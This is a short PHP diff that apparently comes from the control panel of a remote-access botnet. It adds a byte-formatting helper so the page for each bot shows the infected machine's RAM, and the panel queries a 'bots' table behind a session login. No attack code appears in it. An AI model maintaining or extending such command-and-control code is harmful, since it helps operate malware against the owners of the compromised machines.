@@ -297,6 +297,13 @@ class Main{
             $GLOBALS["tpl"]->assign("config", $config);
             $GLOBALS["tpl"]->assign("encryptedOUT", $encryptedOUT);
         }
+
+        function formatBytes($size, $precision = 2) {
+            $base = log($size * 1024, 1024);
+            $suffixes =array('B', 'KB', 'MB', 'GB', 'TB');
+            return round(pow(1024, $base - floor($base)), $precision) .' '. $suffixes[floor($base)];
+        }
+
         public  function botinfo($id){
             if(empty($_SESSION["darkrat_userid"])) {
                 die("Login Required");
@@ -305,6 +312,8 @@ class Main{
             $GLOBALS["template"][1] ="botinfo";
             $statement = $GLOBALS["pdo"]->prepare("SELECT * FROM bots WHERE id = ?");
             $result = $statement->execute(array($id));
-            $GLOBALS["tpl"]->assign("botinfo", $statement->fetch(PDO::FETCH_ASSOC));
+            $row = $statement->fetch(PDO::FETCH_ASSOC);
+            $row["ram"] = $this->formatBytes($row["ram"]);
+            $GLOBALS["tpl"]->assign("botinfo",$row);
         }
 }
